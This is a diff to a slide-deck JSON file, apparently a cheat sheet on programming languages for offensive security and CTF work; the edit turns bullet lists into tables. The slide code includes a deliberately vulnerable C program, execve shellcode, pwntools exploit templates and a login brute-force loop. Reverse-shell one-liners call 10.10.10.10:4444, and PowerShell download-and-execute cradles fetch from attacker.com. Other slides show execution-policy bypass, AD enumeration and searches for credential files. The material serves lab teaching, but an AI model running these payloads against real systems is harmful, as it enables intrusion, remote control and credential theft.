@@ -4,7 +4,7 @@
   "source": "languages/README.md",
   "slides": [
     {
-      "id": "caf765e8-84ef-48e5-8574-132567f24ec5",
+      "id": "9a60f442-e6f2-40a5-a3f8-55be123fe2f5",
       "layout": "center",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -19,6 +19,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -26,6 +30,7 @@
       "showSubtitle": true,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "center",
@@ -33,7 +38,7 @@
       "transition": "zoom"
     },
     {
-      "id": "454682e5-b7d1-4057-bc6a-899f1c3621df",
+      "id": "6cf6d2e6-e551-48b0-ad8f-2de299c099d3",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -47,26 +52,63 @@
       "bodyText": "",
       "bodyColor": "#7ab87a",
       "bodySize": 22,
-      "bullets": [
-        "Language  ::  Primary Use Cases",
-        "C  ::  Systems programming, exploit dev, shellcoding, kernel modules",
-        "C++  ::  Malware development, game hacking, reverse engineering targets",
-        "Python  ::  Automation, exploit scripting, tooling, data parsing",
-        "Bash/Shell  ::  Linux scripting, CTF automation, post-exploitation",
-        "PowerShell  ::  Windows red teaming, AD enumeration, living off the land",
-        "Assembly  ::  Shellcoding, ROP, reversing, low-level debugging",
-        "Rust  ::  Safe systems tooling, offensive frameworks, modern RE targets",
-        "Go  ::  C2 frameworks, network tooling, cross-compiled implants",
-        "JavaScript  ::  XSS payloads, Node.js tools, browser exploitation, web RE",
-        "Java  ::  Android RE, deserialization exploits, enterprise web targets"
-      ],
+      "bullets": [],
+      "tableData": {
+        "headers": [
+          "Language",
+          "Primary Use Cases"
+        ],
+        "rows": [
+          [
+            "C",
+            "Systems programming, exploit dev, shellcoding, kernel modules"
+          ],
+          [
+            "C++",
+            "Malware development, game hacking, reverse engineering targets"
+          ],
+          [
+            "Python",
+            "Automation, exploit scripting, tooling, data parsing"
+          ],
+          [
+            "Bash/Shell",
+            "Linux scripting, CTF automation, post-exploitation"
+          ],
+          [
+            "PowerShell",
+            "Windows red teaming, AD enumeration, living off the land"
+          ],
+          [
+            "Assembly",
+            "Shellcoding, ROP, reversing, low-level debugging"
+          ],
+          [
+            "Rust",
+            "Safe systems tooling, offensive frameworks, modern RE targets"
+          ],
+          [
+            "Go",
+            "C2 frameworks, network tooling, cross-compiled implants"
+          ],
+          [
+            "JavaScript",
+            "XSS payloads, Node.js tools, browser exploitation, web RE"
+          ],
+          [
+            "Java",
+            "Android RE, deserialization exploits, enterprise web targets"
+          ]
+        ]
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
       "showTitle": true,
       "showSubtitle": false,
       "showBody": false,
-      "showBullets": true,
+      "showBullets": false,
+      "showTable": true,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -74,7 +116,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "c2a41cfe-a97f-45eb-b974-d01015c15ba0",
+      "id": "49ce9def-0437-4e66-962b-dda724a44692",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -89,6 +131,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -96,6 +142,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -103,7 +150,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "bfdc58a0-cdfc-4f7e-9add-cbd72af0b936",
+      "id": "b781a350-cea7-4a73-a8cc-16410e87e775",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -118,6 +165,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "// Buffer overflow classic — understanding stack layout\n#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable(char *input) {\n    char buf[64];\n    strcpy(buf, input);  // no bounds check — classic overflow target\n    printf(\"Input: %s\\n\", buf);\n}\n\nint main(int argc, char **argv) {\n    if (argc > 1) vulnerable(argv[1]);\n    return 0;\n}",
       "codeLang": "c",
       "imageUrl": "",
@@ -125,6 +176,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -132,7 +184,7 @@
       "transition": "fade"
     },
     {
-      "id": "fa5d695c-b4ca-4e92-a50d-e1f1f5738832",
+      "id": "d22e8d36-84a8-40aa-ba4f-118255712764",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -147,6 +199,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Compile with various protections for lab work\ngcc vuln.c -o vuln                          # default (ASLR still applies)\ngcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie  # fully vulnerable\ngcc vuln.c -o vuln -fstack-protector-all -pie -Wl,-z,relro    # hardened\n\n# Check binary protections\nchecksec --file=./vuln",
       "codeLang": "bash",
       "imageUrl": "",
@@ -154,6 +210,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -161,7 +218,7 @@
       "transition": "fade"
     },
     {
-      "id": "fc80eca7-38e4-4c3b-a245-e8ea9690af33",
+      "id": "9af6f613-a1d9-46dc-8627-04381abccc17",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -175,22 +232,47 @@
       "bodyText": "",
       "bodyColor": "#7ab87a",
       "bodySize": 22,
-      "bullets": [
-        "Function  ::  Risk",
-        "gets()  ::  No bounds check — always overflows",
-        "strcpy()  ::  No length limit",
-        "sprintf()  ::  Format string + overflow risk",
-        "scanf(\"%s\")  ::  Unbounded string read",
-        "strcat()  ::  Overflow if destination too small",
-        "memcpy()  ::  Safe if sizes correct — often they aren't"
-      ],
+      "bullets": [],
+      "tableData": {
+        "headers": [
+          "Function",
+          "Risk"
+        ],
+        "rows": [
+          [
+            "gets()",
+            "No bounds check — always overflows"
+          ],
+          [
+            "strcpy()",
+            "No length limit"
+          ],
+          [
+            "sprintf()",
+            "Format string + overflow risk"
+          ],
+          [
+            "scanf(\"%s\")",
+            "Unbounded string read"
+          ],
+          [
+            "strcat()",
+            "Overflow if destination too small"
+          ],
+          [
+            "memcpy()",
+            "Safe if sizes correct — often they aren't"
+          ]
+        ]
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
       "showTitle": true,
       "showSubtitle": false,
       "showBody": false,
-      "showBullets": true,
+      "showBullets": false,
+      "showTable": true,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -198,7 +280,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "599f23aa-abd6-41ca-a3eb-f1a544e7a16a",
+      "id": "8bb70f2d-4f38-445f-9dc2-eafc8d0386d4",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -213,6 +295,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "// Minimal execve(\"/bin/sh\") shellcode in C (compile to inspect ASM)\n#include <unistd.h>\n\nint main() {\n    char *args[] = {\"/bin/sh\", NULL};\n    execve(\"/bin/sh\", args, NULL);\n    return 0;\n}",
       "codeLang": "c",
       "imageUrl": "",
@@ -220,6 +306,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -227,7 +314,7 @@
       "transition": "fade"
     },
     {
-      "id": "e0c11d2f-0f02-481c-aaad-44eb7991a34c",
+      "id": "190735e0-cf6a-4d5d-955c-0e026824d0bb",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -242,6 +329,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -249,6 +340,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -256,7 +348,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "62d76eb4-3e21-4941-9b46-c21be319bb44",
+      "id": "9ee6a0c8-499b-4787-afa9-97583136ec03",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -271,6 +363,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Network & Web\nimport socket        # raw TCP/UDP\nimport requests      # HTTP client\nfrom scapy.all import *  # packet crafting\n\n# Binary / Pwn\nfrom pwn import *    # pwntools — exploit dev swiss army knife\n\n# Crypto\nfrom Crypto.Cipher import AES\nfrom cryptography.hazmat.primitives import hashes\n\n# Parsing\nimport struct        # pack/unpack binary data\nimport re            # regex\nimport json, base64, hashlib",
       "codeLang": "python",
       "imageUrl": "",
@@ -278,6 +374,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -285,7 +382,7 @@
       "transition": "fade"
     },
     {
-      "id": "22aa5856-f605-4288-bdc9-fe7b602b2a30",
+      "id": "1bd542ba-b0cc-4f20-bb03-62c5b40cdb20",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -300,6 +397,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "from pwn import *\n\n# Connect\np = process('./vuln')         # local binary\np = remote('host', 1337)      # remote TCP\np = gdb.debug('./vuln', gdbscript='b main\\nc')  # with GDB\n\n# I/O\np.recv(n)                     # receive n bytes\np.recvline()                  # receive until \\n\np.recvuntil(b'> ')            # receive until delimiter\np.send(payload)               # send raw bytes\np.sendline(payload)           # send + \\n\np.sendlineafter(b'> ', data)  # wait then send\n\n# Useful helpers\ncyclic(100)                   # de Bruijn pattern (find offset)\ncyclic_find(0x61616166)       # find offset from crash value\nflat([0x41414141, p64(addr)]) # flatten list to bytes\np64(addr)                     # pack 64-bit little-endian\nu64(data)                     # unpack 64-bit little-endian\nELF('./vuln').symbols['main'] # resolve symbol address\n\n# ROP\nrop = ROP(elf)\nrop.call('system', [next(elf.search(b'/bin/sh'))])",
       "codeLang": "python",
       "imageUrl": "",
@@ -307,6 +408,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -314,7 +416,7 @@
       "transition": "fade"
     },
     {
-      "id": "5f20dbef-cf33-4b0b-94f5-b26c52829460",
+      "id": "4c209f9f-0b1b-45a6-8e0e-13349c454b33",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -329,6 +431,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "from pwn import *\n\ncontext.binary = elf = ELF('./vuln')\ncontext.log_level = 'info'\n\ndef conn():\n    if args.REMOTE:\n        return remote('target.ctf', 1337)\n    return process(elf.path)\n\np = conn()\n\n# Build payload\noffset = 72\npayload  = b'A' * offset\npayload += p64(0xdeadbeef)  # overwrite return address\n\np.sendlineafter(b'> ', payload)\np.interactive()",
       "codeLang": "python",
       "imageUrl": "",
@@ -336,6 +442,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -343,7 +450,7 @@
       "transition": "fade"
     },
     {
-      "id": "d6df085b-8ca4-4215-be2e-24e8779b52d0",
+      "id": "45ae3190-0088-4633-8c3c-c12160c8210e",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -358,6 +465,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Decode base64\npython3 -c \"import base64,sys; print(base64.b64decode(sys.argv[1]).decode())\" <data>\n\n# XOR two hex strings\npython3 -c \"a=bytes.fromhex('deadbeef'); b=bytes.fromhex('cafebabe'); print(bytes(x^y for x,y in zip(a,b)).hex())\"\n\n# Start a simple HTTP server\npython3 -m http.server 8080\n\n# Generate reverse shell payload\npython3 -c \"import socket,subprocess,os; s=socket.socket(); s.connect(('10.10.10.10',4444)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call(['/bin/sh'])\"",
       "codeLang": "bash",
       "imageUrl": "",
@@ -365,6 +476,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -372,7 +484,7 @@
       "transition": "fade"
     },
     {
-      "id": "dfd6a991-1840-437e-b43c-bdf1dc35b351",
+      "id": "c264907e-2393-4080-b496-a8b32dbf5984",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -387,6 +499,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -394,6 +510,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -401,7 +518,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "fa485552-311a-40e0-8cea-ff40cbcf9a0c",
+      "id": "7bb29a6c-286a-4115-bd07-f310a1a49f90",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -416,6 +533,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "#!/usr/bin/env bash\nset -euo pipefail\n\nTARGET=\"http://target.ctf\"\nWORDLIST=\"/usr/share/wordlists/rockyou.txt\"\n\n# Loop + brute-force pattern\nwhile IFS= read -r word; do\n    response=$(curl -s -o /dev/null -w \"%{http_code}\" \\\n        -X POST \"$TARGET/login\" \\\n        -d \"user=admin&pass=$word\")\n    [[ \"$response\" == \"302\" ]] && echo \"[+] Found: $word\" && break\ndone < \"$WORDLIST\"",
       "codeLang": "bash",
       "imageUrl": "",
@@ -423,6 +544,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -430,7 +552,7 @@
       "transition": "fade"
     },
     {
-      "id": "3a7b893e-ba64-4ac9-ad7c-e0f86b943b0c",
+      "id": "e3244430-0402-4a6c-bc25-86f3b70fe18c",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -445,6 +567,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Useful one-liners\n# Reverse shell listener\nnc -lvnp 4444\n\n# Port scan without nmap\nfor port in {1..1000}; do\n    (echo >/dev/tcp/host/$port) &>/dev/null && echo \"Open: $port\"\ndone\n\n# Find SUID binaries\nfind / -perm -4000 -type f 2>/dev/null\n\n# Find world-writable files\nfind / -perm -o+w -type f 2>/dev/null | grep -v /proc\n\n# Extract strings from binary\nstrings -n 8 binary | grep -iE 'pass|flag|key|secret|token'",
       "codeLang": "bash",
       "imageUrl": "",
@@ -452,6 +578,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -459,7 +586,7 @@
       "transition": "fade"
     },
     {
-      "id": "f7829776-486a-40d9-9f78-0ab13ec299cc",
+      "id": "4d017e18-32f6-4856-8b69-9cf3d1516c08",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -474,6 +601,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "cat <<'EOF' > payload.sh\n#!/bin/bash\nbash -i >& /dev/tcp/10.10.10.10/4444 0>&1\nEOF\nchmod +x payload.sh",
       "codeLang": "bash",
       "imageUrl": "",
@@ -481,6 +612,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -488,7 +620,7 @@
       "transition": "fade"
     },
     {
-      "id": "e977ef77-0619-4993-8ac0-6acc826d5738",
+      "id": "0ac02564-dcd4-4c6b-b1d9-f76300e01e89",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -503,6 +635,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -510,6 +646,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -517,7 +654,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "1ed4bcc0-0426-4db1-8c91-8414dcb5a7f8",
+      "id": "a3eb9cf0-1386-419e-a7be-86722acd0c1f",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -532,6 +669,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# System info\nGet-ComputerInfo | Select-Object OsName, OsVersion, CsUserName\nwhoami /all\n\n# Network\nGet-NetTCPConnection | Where-Object State -eq 'Listen'\nipconfig /all\narp -a\n\n# Active Directory enumeration (no extra tools)\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\nGet-ADUser -Filter * -Properties * | Select-Object Name, SamAccountName, Enabled\nGet-ADGroupMember -Identity \"Domain Admins\"\n\n# Process / service recon\nGet-Process | Sort-Object CPU -Descending | Select-Object -First 20\nGet-Service | Where-Object Status -eq 'Running'\n\n# Find credentials / sensitive files\nGet-ChildItem C:\\ -Recurse -Include *.txt,*.ini,*.config,*.xml 2>$null |\n    Select-String -Pattern 'password|pass=|pwd=' -CaseSensitive:$false",
       "codeLang": "powershell",
       "imageUrl": "",
@@ -539,6 +680,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -546,7 +688,7 @@
       "transition": "fade"
     },
     {
-      "id": "25301632-31d5-4eb2-b3f8-08a75db5d107",
+      "id": "35b8995c-126d-444b-b941-b9741bd290e2",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -561,6 +703,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Download file\nInvoke-WebRequest -Uri \"http://attacker.com/tool.exe\" -OutFile \"C:\\Windows\\Temp\\tool.exe\"\n(New-Object Net.WebClient).DownloadFile(\"http://attacker.com/tool.exe\",\"C:\\Temp\\tool.exe\")\n\n# Download and execute in memory (fileless)\nIEX (New-Object Net.WebClient).DownloadString(\"http://attacker.com/script.ps1\")\n\n# Bypass execution policy\npowershell -ExecutionPolicy Bypass -File .\\script.ps1\npowershell -ep bypass -c \"IEX(...)\"\n\n# Base64 encode a command (for obfuscation / stageless delivery)\n$cmd = 'whoami'\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)\n$b64 = [Convert]::ToBase64String($bytes)\npowershell -EncodedCommand $b64",
       "codeLang": "powershell",
       "imageUrl": "",
@@ -568,6 +714,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -575,7 +722,7 @@
       "transition": "fade"
     },
     {
-      "id": "981d934f-75bb-4b7d-8c03-840e4b02bfee",
+      "id": "2ce4f6ab-7c37-4620-8824-b0aa5bbdb0b0",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -590,6 +737,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -597,6 +748,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -604,7 +756,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "a4eab31e-9802-4f98-bebd-bec015625e25",
+      "id": "270981bc-f4fd-4ee1-9add-c7ac04013913",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -618,24 +770,55 @@
       "bodyText": "",
       "bodyColor": "#7ab87a",
       "bodySize": 22,
-      "bullets": [
-        "Register  ::  Purpose",
-        "rax  ::  Return value / syscall number",
-        "rdi  ::  Arg 1 (or syscall arg 1)",
-        "rsi  ::  Arg 2",
-        "rdx  ::  Arg 3",
-        "rsp  ::  Stack pointer",
-        "rbp  ::  Base pointer (frame)",
-        "rip  ::  Instruction pointer",
-        "r10–r11  ::  Syscall args 4–5 / scratch"
-      ],
+      "bullets": [],
+      "tableData": {
+        "headers": [
+          "Register",
+          "Purpose"
+        ],
+        "rows": [
+          [
+            "rax",
+            "Return value / syscall number"
+          ],
+          [
+            "rdi",
+            "Arg 1 (or syscall arg 1)"
+          ],
+          [
+            "rsi",
+            "Arg 2"
+          ],
+          [
+            "rdx",
+            "Arg 3"
+          ],
+          [
+            "rsp",
+            "Stack pointer"
+          ],
+          [
+            "rbp",
+            "Base pointer (frame)"
+          ],
+          [
+            "rip",
+            "Instruction pointer"
+          ],
+          [
+            "r10–r11",
+            "Syscall args 4–5 / scratch"
+          ]
+        ]
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
       "showTitle": true,
       "showSubtitle": false,
       "showBody": false,
-      "showBullets": true,
+      "showBullets": false,
+      "showTable": true,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -643,7 +826,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "94d9273a-93dd-43e3-9647-fcb549663ad4",
+      "id": "f9426b0e-3c3c-4eb3-844d-737a8a6022e3",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -657,22 +840,54 @@
       "bodyText": "",
       "bodyColor": "#7ab87a",
       "bodySize": 22,
-      "bullets": [
-        "Syscall  ::  Number  ::  Args",
-        "read  ::  0  ::  fd, buf, count",
-        "write  ::  1  ::  fd, buf, count",
-        "open  ::  2  ::  filename, flags, mode",
-        "execve  ::  59  ::  filename, argv, envp",
-        "exit  ::  60  ::  error_code",
-        "mmap  ::  9  ::  addr, len, prot, flags, fd, off"
-      ],
+      "bullets": [],
+      "tableData": {
+        "headers": [
+          "Syscall",
+          "Number",
+          "Args"
+        ],
+        "rows": [
+          [
+            "read",
+            "0",
+            "fd, buf, count"
+          ],
+          [
+            "write",
+            "1",
+            "fd, buf, count"
+          ],
+          [
+            "open",
+            "2",
+            "filename, flags, mode"
+          ],
+          [
+            "execve",
+            "59",
+            "filename, argv, envp"
+          ],
+          [
+            "exit",
+            "60",
+            "error_code"
+          ],
+          [
+            "mmap",
+            "9",
+            "addr, len, prot, flags, fd, off"
+          ]
+        ]
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
       "showTitle": true,
       "showSubtitle": false,
       "showBody": false,
-      "showBullets": true,
+      "showBullets": false,
+      "showTable": true,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -680,7 +895,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "79a3682f-bac7-4b43-8c10-29c491e4ceac",
+      "id": "faef56ff-b1b5-4b4c-8875-7da4fca6cec8",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -695,6 +910,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# x86-64 execve(\"/bin/sh\", NULL, NULL)\n.section .text\n.global _start\n_start:\n    xor    %rdx, %rdx           # envp = NULL\n    xor    %rsi, %rsi           # argv = NULL\n    lea    binsh(%rip), %rdi    # rdi = \"/bin/sh\"\n    mov    $59, %rax            # syscall: execve\n    syscall\n\nbinsh:\n    .string \"/bin/sh\"",
       "codeLang": "asm",
       "imageUrl": "",
@@ -702,6 +921,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -709,7 +929,7 @@
       "transition": "fade"
     },
     {
-      "id": "74606e0b-8965-42d1-be45-5885841f0b38",
+      "id": "4f94d0b8-e7ee-462d-9be4-74f74c50b5cd",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -724,6 +944,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Assemble, link, extract shellcode\nas --64 -o shell.o shell.s\nld -o shell shell.o\nobjcopy -O binary --only-section=.text shell shell.bin\nxxd shell.bin | head",
       "codeLang": "bash",
       "imageUrl": "",
@@ -731,6 +955,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -738,7 +963,7 @@
       "transition": "fade"
     },
     {
-      "id": "8a67f6d6-81a7-41ec-b822-e938443b4cf4",
+      "id": "2be0b3e1-cc2d-4fe0-a125-6d210959f4f5",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -753,6 +978,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -760,6 +989,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -767,7 +997,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "03bc8425-73b1-4593-a1b1-c8db9bcec5e4",
+      "id": "a98340e7-8c36-41da-89e5-bd1c935548a1",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -787,6 +1017,10 @@
         "Cross-compilation is straightforward",
         "Increasingly common in modern malware and C2 frameworks as a target for RE"
       ],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Cross-compile to Windows from Linux\nrustup target add x86_64-pc-windows-gnu\ncargo build --release --target x86_64-pc-windows-gnu\n\n# Strip symbols (reduce AV surface / binary size)\ncargo build --release\nstrip target/release/tool",
       "codeLang": "bash",
       "imageUrl": "",
@@ -794,6 +1028,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": true,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -801,7 +1036,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "e798d5e1-90bc-4b58-b98f-645141db7014",
+      "id": "99008c02-193a-4fc3-a554-72796a454fb4",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -816,6 +1051,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Cargo.toml — useful security/net crates\n[dependencies]\ntokio     = { version = \"1\", features = [\"full\"] }  # async runtime\nreqwest   = { version = \"0.11\", features = [\"json\"] }  # HTTP\nclap      = { version = \"4\", features = [\"derive\"] }   # CLI args\nserde     = { version = \"1\", features = [\"derive\"] }   # serialization\naes       = \"0.8\"   # symmetric crypto\nsha2      = \"0.10\"  # hashing",
       "codeLang": "toml",
       "imageUrl": "",
@@ -823,6 +1062,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -830,7 +1070,7 @@
       "transition": "fade"
     },
     {
-      "id": "34a70204-8884-4f8c-ab28-6306fa2d61d9",
+      "id": "cd87cdf8-0171-41dd-a0dc-d69821a1cdf3",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -845,6 +1085,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -852,6 +1096,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -859,7 +1104,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "ac6b1aa6-f692-406f-be37-e5ffb0d35ffe",
